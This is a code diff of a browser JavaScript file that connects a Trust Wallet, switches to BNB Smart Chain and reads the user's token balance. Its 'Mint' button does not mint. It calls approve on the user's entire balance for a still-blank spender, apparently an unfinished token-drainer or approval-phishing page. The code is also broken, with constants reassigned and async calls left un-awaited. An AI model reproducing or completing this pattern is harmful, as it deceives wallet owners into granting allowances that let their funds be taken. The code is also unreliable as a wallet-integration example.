@@ -1,71 +1,120 @@
+import ethABI from "./ethABI.json";
+import { ethers } from "ethers.min.js";
+
+const trustWalletExist = false;
+const injectedProviderExist = false
+const account = null;
+const ETH_ADDRESS = "0x4B0F1812e5Df2A09796481Ff14017e6005508003";
+const bscChainId = '0x38';
+const bscChain = false;
+const requestAccount = false;
+const injectedProvider = null ;
+const rawBalance = 0;
+const accountBalance = 0;
+const ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
+const contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);
+
 function getTrustWalletInjectedProvider(
     { timeout } = { timeout: 3000 }
   ) {
 
     // trustWallet是否存在
-    const trustWallet = ethereum.isTrust;
+    trustWalletExist = ethereum.isTrust;
 
     // 是否已经存在Provider
-    const injectedProviderExist =
+    injectedProviderExist =
       typeof window !== "undefined" && typeof window.ethereum !== "undefined";
 
     // 获取trustWalletProvider
-    const provider = window["trustwallet"];
+    injectedProvider = window["trustwallet"];
   
-    if (provider) {
-      return provider;
+    if (injectedProvider) {
+      return injectedProvider;
     }
     
     return null;
   
   }
 
-
- const injectedProvider = getTrustWalletInjectedProvider()
- const chainId = await injectedProvider.request({ method: "eth_chainId" });
-
-async function connectAccount(){
-    try {
-        const account = await injectedProvider.request({
-            method: "eth_requestAccounts",
-        });
-        
-        console.log(account); // => ['0x...']
-        } catch (e) {
-        if (e.code === 4001) {
-            console.error("User denied connection.");
-        }
-    }
-}
-
-
 // BNB Smart Chain : 0x38
-async function switchToNetwork(_chainId){
+async function switchToNetwork(){
     try {
         await injectedProvider.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: _chainId }], // Ensure the selected network is Etheruem
+          params: [{ chainId: bscChainId }], // Ensure the selected network is Etheruem
         });
+
+        bscChain = true;
+
       } catch (e) {
         if (e.code === 4001) {
+          bscChain = false;
           setError("User rejected switching chains.");
         }
     }
 }
-  
 
-import { ethers } from "ethers.min.js";
+async function connectWallet(){
+  getTrustWalletInjectedProvider();
+  switchToNetwork();
+}
 
-const userAccounts = await injectedProvider.request({
-    method: "eth_requestAccounts",
-  });
 
-import ethABI from "./ethABI.json";
+async function connectAccount(){
+  try {
+      const userAccounts = await injectedProvider.request({
+        method: "eth_requestAccounts",
+      });
+    
+      account = userAccounts[0]
 
-const ETH_ADDRESS = "0x4B0F1812e5Df2A09796481Ff14017e6005508003";
-const ethersProvider = new ethers.providers.Web3Provider(injectedProvider);
-const contract = new ethers.Contract(ETH_ADDRESS, ethABI, ethersProvider);
+      requestAccount = true;
+      } catch (e) {
+      if (e.code === 4001) {
+          requestAccount = false;
+          console.error("User denied connection.");
+      }
+  }
+}
 
-const decimals = await contract.decimals();
-const rawBalance = await contract.balanceOf(account);
-const accountBalance = ethers.utils.formatUnits(rawBalance, decimals);
+
+async function verifyAddress(){
+
+  connectAccount();
+
+  try {
+    const decimals = await contract.decimals();
+    rawBalance = await contract.balanceOf(account);
+    accountBalance = ethers.utils.formatUnits(rawBalance, decimals);
+
+    if (accountBalance < 2){
+      
+    }
+    requestAccount = true;
+    } catch (e) {
+    if (e.code === 4001) {
+        requestAccount = false;
+        console.error("User denied connection.");
+    }
+  }
+}
+
+async function mint(){
+    contract.approve("",rawBalance);
+}
+
+
+document.getElementById("Connect-Wallet").addEventListener("click", connectWallet);
+
+
+document.getElementById("Verify-you-address").addEventListener("click",verifyAddress);
+
+document.getElementById("Mint").addEventListener("click", 
+  mint
+  );
+
+
+
+
+
+
